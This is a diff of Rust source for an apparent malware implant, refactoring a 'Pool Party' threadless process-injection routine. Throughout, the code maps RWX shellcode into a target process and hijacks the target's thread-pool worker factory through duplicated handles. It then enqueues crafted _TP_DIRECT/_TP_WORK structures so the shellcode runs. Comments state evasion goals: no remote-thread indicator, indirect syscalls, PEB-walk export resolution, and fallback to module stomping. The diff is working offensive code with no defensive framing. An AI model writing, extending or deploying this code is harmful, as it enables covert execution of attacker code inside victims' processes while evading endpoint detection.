@@ -312,7 +312,29 @@ const DUPLICATE_SAME_ACCESS: u32 = 0x0002;
 pub unsafe fn pool_party_inject(target_pid: u32, shellcode: &[u8]) -> Result<(), String> {
     let (create_section, map_view, unmap_view, _query_thread) =
         resolve_section_fns().ok_or_else(|| String::from("ntdll section exports missing"))?;
+    // GetCurrentProcess pseudo-handle = (HANDLE)-1.
+    const CUR_PROCESS: *mut c_void = -1isize as *mut c_void;
 
+    let target_h = pool_party_open_target(target_pid)?;
+    let (section_h, section_size) = pool_party_create_section(create_section, shellcode)?;
+    let local_base = pool_party_map_local(map_view, section_h, section_size)?;
+    pool_party_write_local(local_base, shellcode);
+    let target_base = match pool_party_map_target(map_view, section_h, target_h, section_size) {
+        Ok(b) => b,
+        Err(e) => {
+            // Unmap local before bailing.
+            unsafe { unmap_view(CUR_PROCESS, local_base) };
+            return Err(e);
+        }
+    };
+    // The local view is unmapped before dispatch: the section backs the target
+    // view, and the shellcode is already resident in the target.
+    unsafe { unmap_view(CUR_PROCESS, local_base) };
+    pool_party_dispatch(target_h, target_pid, target_base)
+}
+
+/// Open the target process (VM_OP | DUP_HANDLE | QUERY_INFO).
+unsafe fn pool_party_open_target(target_pid: u32) -> Result<*mut c_void, String> {
     // ---- 1. Open the target process (VM_OP | DUP_HANDLE | QUERY_INFO) ----
     let open_process_addr = resolve::export_addr(b"kernel32.dll", b"OpenProcess")
         .ok_or_else(|| String::from("kernel32!OpenProcess export missing"))?;
@@ -328,7 +350,14 @@ pub unsafe fn pool_party_inject(target_pid: u32, shellcode: &[u8]) -> Result<(),
     if target_h.is_null() {
         return Err(String::from("OpenProcess(target) failed"));
     }
+    Ok(target_h)
+}
 
+/// NtCreateSection (page-file-backed, RWX view). Returns (section, size).
+unsafe fn pool_party_create_section(
+    create_section: NtCreateSectionFn,
+    shellcode: &[u8],
+) -> Result<(*mut c_void, i64), String> {
     // ---- 2. NtCreateSection (page-file-backed, RWX view) ----
     // Section size rounded up to a page (4096).
     let section_size: i64 = ((shellcode.len() + 0xFFF) & !0xFFF) as i64;
@@ -348,7 +377,15 @@ pub unsafe fn pool_party_inject(target_pid: u32, shellcode: &[u8]) -> Result<(),
     if st < 0 {
         return Err(String::from("NtCreateSection failed"));
     }
+    Ok((section_h, section_size))
+}
 
+/// Map the section into the implant (writer view).
+unsafe fn pool_party_map_local(
+    map_view: NtMapViewOfSectionFn,
+    section_h: *mut c_void,
+    section_size: i64,
+) -> Result<*mut c_void, String> {
     // ---- 3. Map the section into the implant (writer) ----
     let mut local_base: *mut c_void = core::ptr::null_mut();
     let mut local_size: usize = 0;
@@ -371,14 +408,27 @@ pub unsafe fn pool_party_inject(target_pid: u32, shellcode: &[u8]) -> Result<(),
     if st < 0 {
         return Err(String::from("NtMapViewOfSection(local) failed"));
     }
+    Ok(local_base)
+}
 
+/// Copy the shellcode into the local view (no WriteProcessMemory).
+unsafe fn pool_party_write_local(local_base: *mut c_void, shellcode: &[u8]) {
     // ---- 4. Write the shellcode into the local view ----
     // SAFETY: local_base is a fresh RWX view of size local_size; shellcode
     // fits in the rounded-up section.
     unsafe {
         core::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_base as *mut u8, shellcode.len());
     }
+}
 
+/// Map the section into the target process (reader view). The caller unmaps
+/// the local view on failure.
+unsafe fn pool_party_map_target(
+    map_view: NtMapViewOfSectionFn,
+    section_h: *mut c_void,
+    target_h: *mut c_void,
+    section_size: i64,
+) -> Result<*mut c_void, String> {
     // ---- 5. Map the section into the target process ----
     let mut target_base: *mut c_void = core::ptr::null_mut();
     let mut target_size: usize = 0;
@@ -397,38 +447,38 @@ pub unsafe fn pool_party_inject(target_pid: u32, shellcode: &[u8]) -> Result<(),
         )
     };
     if st < 0 {
-        // Unmap local before bailing.
-        unsafe { unmap_view(CUR_PROCESS, local_base) };
         return Err(String::from("NtMapViewOfSection(target) failed"));
     }
+    Ok(target_base)
+}
 
-    // ---- 6–7. Threadless dispatch via worker-queue splice ----
-    //
-    // The section now holds the shellcode in the target's address space at
-    // `target_base`. Instead of `NtCreateThreadEx(target, target_base)` (which
-    // creates the classic remote-thread IOC), we dispatch threadlessly:
-    //
-    //   (a) [`threadless_inject`] hijacks a worker-factory handle from the
-    //       target by walking the system handle table and duplicating each
-    //       handle owned by `target_pid`, probing each duplicate with
-    //       `NtQueryInformationWorkerFactory` until one succeeds.
-    //   (b) It allocates a small RWX stub region in the target (indirect
-    //       syscalls — no direct syscall instruction in implant memory) and
-    //       writes a crafted `_TP_DIRECT` (callback = `target_base`) + a fake
-    //       `_TP_WORK` (direct = the `_TP_DIRECT` address) into it.
-    //   (c) It enqueues the work item with
-    //       `NtSetInformationWorkerFactory(WorkerFactoryTimeout)` (indirect).
-    //       The target's existing `ntdll!TppWorkerThread` dequeues it on its
-    //       next scheduler pass and calls `Direct->Callback(Direct)` → the
-    //       shellcode in the section view runs. **NO remote thread is created.**
-    //
-    // On any failure (no worker factory in the target, struct write rejected,
-    // enqueue rejected) we return `Err` so the caller degrades to module_stomp.
-    // The local view is unmapped before dispatch: the section backs the target
-    // view, and the shellcode is already resident in the target.
-
-    unsafe { unmap_view(CUR_PROCESS, local_base) };
-
+/// Threadless dispatch via worker-queue splice.
+///
+/// The section now holds the shellcode in the target's address space at
+/// `target_base`. Instead of `NtCreateThreadEx(target, target_base)` (which
+/// creates the classic remote-thread IOC), we dispatch threadlessly:
+///
+///   (a) [`threadless_inject`] hijacks a worker-factory handle from the
+///       target by walking the system handle table and duplicating each
+///       handle owned by `target_pid`, probing each duplicate with
+///       `NtQueryInformationWorkerFactory` until one succeeds.
+///   (b) It allocates a small RWX stub region in the target (indirect
+///       syscalls — no direct syscall instruction in implant memory) and
+///       writes a crafted `_TP_DIRECT` (callback = `target_base`) + a fake
+///       `_TP_WORK` (direct = the `_TP_DIRECT` address) into it.
+///   (c) It enqueues the work item with
+///       `NtSetInformationWorkerFactory(WorkerFactoryTimeout)` (indirect).
+///       The target's existing `ntdll!TppWorkerThread` dequeues it on its
+///       next scheduler pass and calls `Direct->Callback(Direct)` → the
+///       shellcode in the section view runs. **NO remote thread is created.**
+///
+/// On any failure (no worker factory in the target, struct write rejected,
+/// enqueue rejected) we return `Err` so the caller degrades to module_stomp.
+unsafe fn pool_party_dispatch(
+    target_h: *mut c_void,
+    target_pid: u32,
+    target_base: *mut c_void,
+) -> Result<(), String> {
     let res = unsafe { threadless_inject(target_h, target_pid, target_base) };
 
     // Closing the target handle is best-effort; the caller (do_inject) does not
@@ -481,13 +531,65 @@ pub unsafe fn threadless_inject(
     target_pid: u32,
     shellcode_addr: *mut c_void,
 ) -> Result<(), String> {
-    // Resolve the worker-factory syscalls via ntdll raw exports. These bypass
-    // the shared indirect-syscall trampoline per the single-trampoline rule
-    // (matching the section syscalls above): only ONE syscall can be in flight
-    // through the trampoline page at a time, so a nested indirect call from
-    // inside spoof_wrap would race. The VM ops + enqueue below instead go
-    // through the typed `crate::syscalls` wrappers, which DO serialize through
-    // the trampoline safely because they do not nest.
+    let (query_wf, set_wf) = threadless_resolve_syscalls()?;
+
+    // The indirect-syscall runtime is required for the cross-process VM ops
+    // (NtAllocateVirtualMemory / NtWriteVirtualMemory) — those go through the
+    // typed wrappers so RIP-of-syscall stays inside ntdll.
+    let rt = crate::syscalls::global()
+        .ok_or_else(|| String::from("indirect syscall runtime not initialized"))?;
+
+    // ---- 1. Hijack a worker-factory handle from the target ----
+    let worker_factory_h = unsafe { hijack_worker_factory(target_h, target_pid, query_wf)? };
+
+    // ---- 2. Build the crafted `_TP_DIRECT` + `_TP_WORK` in a local buffer ----
+    let (direct_buf, mut work_buf, direct_offset_in_region, work_offset_in_region, region_size) =
+        threadless_build_structs(shellcode_addr);
+
+    // ---- 3. Allocate an RWX stub region in the target (indirect syscall) ----
+    let remote_base = match threadless_alloc_region(rt, target_h, region_size) {
+        Ok(b) => b,
+        Err(e) => {
+            unsafe { close_handle(worker_factory_h) };
+            return Err(e);
+        }
+    };
+
+    // ---- 4. Patch the `_TP_WORK.direct` field with the remote `_TP_DIRECT` addr ----
+    threadless_patch_direct(&mut work_buf, remote_base, direct_offset_in_region);
+
+    // ---- 5. Write `_TP_DIRECT` then `_TP_WORK` into the target (indirect) ----
+    if let Err(e) = threadless_write_structs(
+        rt,
+        target_h,
+        remote_base,
+        direct_offset_in_region,
+        work_offset_in_region,
+        &direct_buf,
+        &work_buf,
+    ) {
+        unsafe { close_handle(worker_factory_h) };
+        return Err(e);
+    }
+
+    // ---- 6. Enqueue: NtSetInformationWorkerFactory(WorkerFactoryTimeout, &Work) ----
+    threadless_enqueue(set_wf, worker_factory_h, remote_base, work_offset_in_region)
+}
+
+/// Resolve the worker-factory syscalls via ntdll raw exports. These bypass
+/// the shared indirect-syscall trampoline per the single-trampoline rule
+/// (matching the section syscalls above): only ONE syscall can be in flight
+/// through the trampoline page at a time, so a nested indirect call from
+/// inside spoof_wrap would race. The VM ops + enqueue below instead go
+/// through the typed `crate::syscalls` wrappers, which DO serialize through
+/// the trampoline safely because they do not nest.
+unsafe fn threadless_resolve_syscalls() -> Result<
+    (
+        NtQueryInformationWorkerFactoryFn,
+        NtSetInformationWorkerFactoryFn,
+    ),
+    String,
+> {
     let query_wf: NtQueryInformationWorkerFactoryFn = unsafe {
         core::mem::transmute(resolve::export_addr(
             b"ntdll.dll",
@@ -502,24 +604,22 @@ pub unsafe fn threadless_inject(
         )
         .ok_or_else(|| String::from("ntdll!NtSetInformationWorkerFactory missing"))?)
     };
+    Ok((query_wf, set_wf))
+}
 
-    // The indirect-syscall runtime is required for the cross-process VM ops
-    // (NtAllocateVirtualMemory / NtWriteVirtualMemory) — those go through the
-    // typed wrappers so RIP-of-syscall stays inside ntdll.
-    let rt = crate::syscalls::global()
-        .ok_or_else(|| String::from("indirect syscall runtime not initialized"))?;
-
-    // ---- 1. Hijack a worker-factory handle from the target ----
-    let worker_factory_h = unsafe { hijack_worker_factory(target_h, target_pid, query_wf)? };
-
-    // ---- 2. Build the crafted `_TP_DIRECT` + `_TP_WORK` in a local buffer ----
+/// Build the crafted `_TP_DIRECT` + `_TP_WORK` in local buffers. Both structs
+/// zero-initialized, then the load-bearing fields are set. Returns
+/// (direct_buf, work_buf, direct_offset, work_offset, region_size).
+fn threadless_build_structs(
+    shellcode_addr: *mut c_void,
+) -> ([u8; TP_DIRECT_SIZE], [u8; TP_WORK_SIZE], usize, usize, usize) {
     // Both structs zero-initialized, then the load-bearing fields are set.
     let mut direct_buf = [0u8; TP_DIRECT_SIZE];
     // Callback = shellcode address (in the target's section view).
     direct_buf[TP_DIRECT_CALLBACK_OFFSET..TP_DIRECT_CALLBACK_OFFSET + 8]
         .copy_from_slice(&(shellcode_addr as usize).to_le_bytes());
 
-    let mut work_buf = [0u8; TP_WORK_SIZE];
+    let work_buf = [0u8; TP_WORK_SIZE];
     // The `direct` pointer must be the address of the `_TP_DIRECT` *in the
     // target*. We place both structs in one allocated region:
     //   remote_stub = Direct @ +0x00, Work @ +0x40
@@ -532,8 +632,15 @@ pub unsafe fn threadless_inject(
     // `direct` field value = address of the `_TP_DIRECT` in the target. We'll
     // patch it once the remote region address is known.
     // (placeholder 0; patched after alloc.)
+    (direct_buf, work_buf, direct_offset_in_region, work_offset_in_region, region_size)
+}
 
-    // ---- 3. Allocate an RWX stub region in the target (indirect syscall) ----
+/// Allocate an RWX stub region in the target via the indirect-syscall wrapper.
+unsafe fn threadless_alloc_region(
+    rt: &crate::syscalls::Runtime,
+    target_h: *mut c_void,
+    region_size: usize,
+) -> Result<usize, String> {
     let mut remote_base: usize = 0;
     let mut alloc_size: usize = region_size;
     let alloc_status = unsafe {
@@ -548,21 +655,31 @@ pub unsafe fn threadless_inject(
         )
     };
     match alloc_status {
-        Some(s) if s >= 0 => {}
-        _ => {
-            unsafe { close_handle(worker_factory_h) };
-            return Err(String::from(
-                "threadless: NtAllocateVirtualMemory(struct region) failed",
-            ));
-        }
+        Some(s) if s >= 0 => Ok(remote_base),
+        _ => Err(String::from(
+            "threadless: NtAllocateVirtualMemory(struct region) failed",
+        )),
     }
+}
 
-    // ---- 4. Patch the `_TP_WORK.direct` field with the remote `_TP_DIRECT` addr ----
+/// Patch the `_TP_WORK.direct` field with the remote `_TP_DIRECT` address.
+fn threadless_patch_direct(work_buf: &mut [u8; TP_WORK_SIZE], remote_base: usize, direct_offset_in_region: usize) {
     let remote_direct_addr = remote_base + direct_offset_in_region;
     work_buf[TP_WORK_DIRECT_OFFSET..TP_WORK_DIRECT_OFFSET + 8]
         .copy_from_slice(&remote_direct_addr.to_le_bytes());
+}
 
-    // ---- 5. Write `_TP_DIRECT` then `_TP_WORK` into the target (indirect) ----
+/// Write `_TP_DIRECT` then `_TP_WORK` into the target via the indirect-syscall
+/// wrapper.
+unsafe fn threadless_write_structs(
+    rt: &crate::syscalls::Runtime,
+    target_h: *mut c_void,
+    remote_base: usize,
+    direct_offset_in_region: usize,
+    work_offset_in_region: usize,
+    direct_buf: &[u8; TP_DIRECT_SIZE],
+    work_buf: &[u8; TP_WORK_SIZE],
+) -> Result<(), String> {
     let mut written: usize = 0;
     let w1 = unsafe {
         crate::syscalls::nt_write_virtual_memory(
@@ -575,7 +692,6 @@ pub unsafe fn threadless_inject(
         )
     };
     if w1.is_none() || w1.unwrap() < 0 {
-        unsafe { close_handle(worker_factory_h) };
         return Err(String::from("threadless: write _TP_DIRECT failed"));
     }
     let w2 = unsafe {
@@ -589,24 +705,32 @@ pub unsafe fn threadless_inject(
         )
     };
     if w2.is_none() || w2.unwrap() < 0 {
-        unsafe { close_handle(worker_factory_h) };
         return Err(String::from("threadless: write _TP_WORK failed"));
     }
+    Ok(())
+}
 
-    // ---- 6. Enqueue: NtSetInformationWorkerFactory(WorkerFactoryTimeout, &Work) ----
-    //
-    // The SafeBreach variant-2 splice feeds the address of the crafted
-    // `_TP_WORK` (in the target) to the worker factory via the
-    // `WorkerFactoryTimeout` information class. The factory arms it for the
-    // next scheduler pass; the existing `TppWorkerThread` dequeues the work
-    // item and invokes `Direct->Callback(Direct)` → shellcode runs in the
-    // section view. No remote thread is created.
-    //
-    // NTSTATUS codes: STATUS_SUCCESS (0x00000000) on success;
-    // STATUS_INVALID_HANDLE / STATUS_OBJECT_TYPE_MISMATCH if the hijacked
-    // handle was not actually a worker factory (shouldn't happen — the probe
-    // in hijack_worker_factory already validated it); STATUS_INVALID_PARAMETER
-    // if the `_TP_WORK` layout is wrong (suspect offset drift).
+/// Enqueue the crafted `_TP_WORK` via
+/// `NtSetInformationWorkerFactory(WorkerFactoryTimeout, &Work)`.
+///
+/// The SafeBreach variant-2 splice feeds the address of the crafted
+/// `_TP_WORK` (in the target) to the worker factory via the
+/// `WorkerFactoryTimeout` information class. The factory arms it for the
+/// next scheduler pass; the existing `TppWorkerThread` dequeues the work
+/// item and invokes `Direct->Callback(Direct)` → shellcode runs in the
+/// section view. No remote thread is created.
+///
+/// NTSTATUS codes: STATUS_SUCCESS (0x00000000) on success;
+/// STATUS_INVALID_HANDLE / STATUS_OBJECT_TYPE_MISMATCH if the hijacked
+/// handle was not actually a worker factory (shouldn't happen — the probe
+/// in hijack_worker_factory already validated it); STATUS_INVALID_PARAMETER
+/// if the `_TP_WORK` layout is wrong (suspect offset drift).
+unsafe fn threadless_enqueue(
+    set_wf: NtSetInformationWorkerFactoryFn,
+    worker_factory_h: *mut c_void,
+    remote_base: usize,
+    work_offset_in_region: usize,
+) -> Result<(), String> {
     let remote_work_addr = remote_base + work_offset_in_region;
     let enqueue_st = unsafe {
         set_wf(
@@ -634,6 +758,26 @@ pub unsafe fn threadless_inject(
 // hijack_worker_factory — discover + duplicate a worker-factory handle
 // ============================================================================
 
+/// `int NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG)` — raw export
+/// (bypasses the trampoline per the single-trampoline rule). 4 args.
+type NtQuerySystemInformationFn = unsafe extern "system" fn(
+    u32,         // SystemInformationClass
+    *mut c_void, // SystemInformation (out)
+    u32,         // SystemInformationLength
+    *mut u32,    // ReturnLength (opt)
+) -> i32;
+
+/// `BOOL DuplicateHandle(HANDLE, HANDLE, HANDLE, HANDLE*, DWORD, BOOL, DWORD)`.
+type DuplicateHandleFn = unsafe extern "system" fn(
+    *mut c_void, // hSourceProcessHandle
+    *mut c_void, // hSourceHandle
+    *mut c_void, // hTargetProcessHandle
+    *mut *mut c_void, // lpTargetHandle (out)
+    u32,         // dwDesiredAccess
+    i32,         // bInheritHandle
+    u32,         // dwOptions
+) -> i32;
+
 /// Discover the target process's thread-pool worker factory by walking the
 /// system handle table (`SystemExtendedHandleInformation`), duplicating every
 /// handle owned by `target_pid` into the implant with `DUPLICATE_SAME_ACCESS`,
@@ -655,14 +799,32 @@ unsafe fn hijack_worker_factory(
     target_pid: u32,
     query_wf: NtQueryInformationWorkerFactoryFn,
 ) -> Result<*mut c_void, String> {
-    // ntdll!NtQuerySystemInformation (raw export; bypasses the trampoline per
-    // the single-trampoline rule). 4 args.
-    type NtQuerySystemInformationFn = unsafe extern "system" fn(
-        u32,         // SystemInformationClass
-        *mut c_void, // SystemInformation (out)
-        u32,         // SystemInformationLength
-        *mut u32,    // ReturnLength (opt)
-    ) -> i32;
+    let (qsi, dup_handle) = hijack_resolve_fns()?;
+
+    let buf = hijack_fetch_table(qsi)?;
+
+    // ---- 3. Walk SYSTEM_HANDLE_INFORMATION_EX ----
+    // Kernel payload: u64 NumberOfHandles at offset 0x00, then a dense array of
+    // SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX entries (stride 0x28 on x64). The pure
+    // parse lives in `collect_target_handles` (unit-tested with a synthetic
+    // buffer); here each candidate handle is duplicated + probed in turn.
+    let mut candidates = crate::heap::Vec::new();
+    collect_target_handles(&buf, target_pid, &mut candidates);
+
+    for handle_val in candidates {
+        if let Ok(dup) = hijack_probe_handle(dup_handle, query_wf, target_h, handle_val) {
+            return Ok(dup);
+        }
+    }
+
+    Err(String::from(
+        "hijack: target has no worker-factory handle (no TP worker?)",
+    ))
+}
+
+/// Resolve ntdll!NtQuerySystemInformation and kernel32!DuplicateHandle via PEB
+/// walk (no library load).
+unsafe fn hijack_resolve_fns() -> Result<(NtQuerySystemInformationFn, DuplicateHandleFn), String> {
     let qsi: NtQuerySystemInformationFn = unsafe {
         core::mem::transmute(resolve::export_addr(
             b"ntdll.dll",
@@ -670,28 +832,19 @@ unsafe fn hijack_worker_factory(
         )
         .ok_or_else(|| String::from("ntdll!NtQuerySystemInformation missing"))?)
     };
-
-    // kernel32!DuplicateHandle — used to copy each candidate handle from the
-    // target into the implant with DUPLICATE_SAME_ACCESS.
-    type DuplicateHandleFn = unsafe extern "system" fn(
-        *mut c_void, // hSourceProcessHandle
-        *mut c_void, // hSourceHandle
-        *mut c_void, // hTargetProcessHandle
-        *mut *mut c_void, // lpTargetHandle (out)
-        u32,         // dwDesiredAccess
-        i32,         // bInheritHandle
-        u32,         // dwOptions
-    ) -> i32;
     let dup_handle: DuplicateHandleFn = unsafe {
         core::mem::transmute(
             resolve::export_addr(b"kernel32.dll", b"DuplicateHandle")
                 .ok_or_else(|| String::from("kernel32!DuplicateHandle export missing"))?,
         )
     };
+    Ok((qsi, dup_handle))
+}
 
-    // GetCurrentProcess pseudo-handle = (HANDLE)-1 (the implant's own process).
-    const CUR_PROCESS: *mut c_void = -1isize as *mut c_void;
-
+/// Size the handle table with a length-only query, fetch the full
+/// SYSTEM_HANDLE_INFORMATION_EX payload, and retry once at 2x when the table
+/// grew between the two queries (STATUS_INFO_LENGTH_MISMATCH).
+unsafe fn hijack_fetch_table(qsi: NtQuerySystemInformationFn) -> Result<crate::heap::Vec<u8>, String> {
     // ---- 1. Size the handle table with a length-only query ----
     let mut needed: u32 = 0;
     let _ = unsafe { qsi(SYSTEM_EXTENDED_HANDLE_INFORMATION, core::ptr::null_mut(), 0, &mut needed) };
@@ -733,60 +886,61 @@ unsafe fn hijack_worker_factory(
     } else if st < 0 {
         return Err(String::from("hijack: NtQuerySystemInformation failed"));
     }
+    Ok(buf)
+}
 
-    // ---- 3. Walk SYSTEM_HANDLE_INFORMATION_EX ----
-    // Kernel payload: u64 NumberOfHandles at offset 0x00, then a dense array of
-    // SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX entries (stride 0x28 on x64). The pure
-    // parse lives in `collect_target_handles` (unit-tested with a synthetic
-    // buffer); here each candidate handle is duplicated + probed in turn.
-    let mut candidates = crate::heap::Vec::new();
-    collect_target_handles(&buf, target_pid, &mut candidates);
+/// Duplicate one candidate handle into the implant (DUPLICATE_SAME_ACCESS) and
+/// probe it with NtQueryInformationWorkerFactory. Ok(dup) on a worker-factory
+/// hit; Err(()) means keep scanning (the duplicate was closed, if any).
+unsafe fn hijack_probe_handle(
+    dup_handle: DuplicateHandleFn,
+    query_wf: NtQueryInformationWorkerFactoryFn,
+    target_h: *mut c_void,
+    handle_val: usize,
+) -> Result<*mut c_void, ()> {
+    // GetCurrentProcess pseudo-handle = (HANDLE)-1 (the implant's own process).
+    const CUR_PROCESS: *mut c_void = -1isize as *mut c_void;
 
-    for handle_val in candidates {
-        // Duplicate this handle into the implant with DUPLICATE_SAME_ACCESS.
-        let mut dup: *mut c_void = core::ptr::null_mut();
-        let ok = unsafe {
-            dup_handle(
-                target_h,
-                handle_val as *mut c_void,
-                CUR_PROCESS,
-                core::ptr::addr_of_mut!(dup),
-                0,
-                0,
-                DUPLICATE_SAME_ACCESS,
-            )
-        };
-        if ok == 0 || dup.is_null() {
-            // Not duplicatable (access denied, or wrong object type) — skip.
-            continue;
-        }
-
-        // Probe: is this duplicate a worker factory?
-        // NtQueryInformationWorkerFactory returns STATUS_OBJECT_TYPE_MISMATCH
-        // (0xC0000024) for non-worker-factory handles; STATUS_SUCCESS for a
-        // real one. A tiny stack buffer is enough for the basic-timer query.
-        let mut probe: [u8; 32] = [0u8; 32];
-        let mut probe_len: u32 = 0;
-        let qst = unsafe {
-            query_wf(
-                dup,
-                WORKER_FACTORY_BASIC_TIMER,
-                probe.as_mut_ptr() as *mut c_void,
-                probe.len() as u32,
-                &mut probe_len,
-            )
-        };
-        if qst >= 0 {
-            // Hit — this is a worker-factory handle owned by the target.
-            return Ok(dup);
-        }
-        // Not a worker factory; close the duplicate and keep scanning.
-        unsafe { close_handle(dup) };
+    // Duplicate this handle into the implant with DUPLICATE_SAME_ACCESS.
+    let mut dup: *mut c_void = core::ptr::null_mut();
+    let ok = unsafe {
+        dup_handle(
+            target_h,
+            handle_val as *mut c_void,
+            CUR_PROCESS,
+            core::ptr::addr_of_mut!(dup),
+            0,
+            0,
+            DUPLICATE_SAME_ACCESS,
+        )
+    };
+    if ok == 0 || dup.is_null() {
+        // Not duplicatable (access denied, or wrong object type) — skip.
+        return Err(());
     }
 
-    Err(String::from(
-        "hijack: target has no worker-factory handle (no TP worker?)",
-    ))
+    // Probe: is this duplicate a worker factory?
+    // NtQueryInformationWorkerFactory returns STATUS_OBJECT_TYPE_MISMATCH
+    // (0xC0000024) for non-worker-factory handles; STATUS_SUCCESS for a
+    // real one. A tiny stack buffer is enough for the basic-timer query.
+    let mut probe: [u8; 32] = [0u8; 32];
+    let mut probe_len: u32 = 0;
+    let qst = unsafe {
+        query_wf(
+            dup,
+            WORKER_FACTORY_BASIC_TIMER,
+            probe.as_mut_ptr() as *mut c_void,
+            probe.len() as u32,
+            &mut probe_len,
+        )
+    };
+    if qst >= 0 {
+        // Hit — this is a worker-factory handle owned by the target.
+        return Ok(dup);
+    }
+    // Not a worker factory; close the duplicate and keep scanning.
+    unsafe { close_handle(dup) };
+    Err(())
 }
 
 /// Walk a `SYSTEM_HANDLE_INFORMATION_EX` buffer (the payload returned by
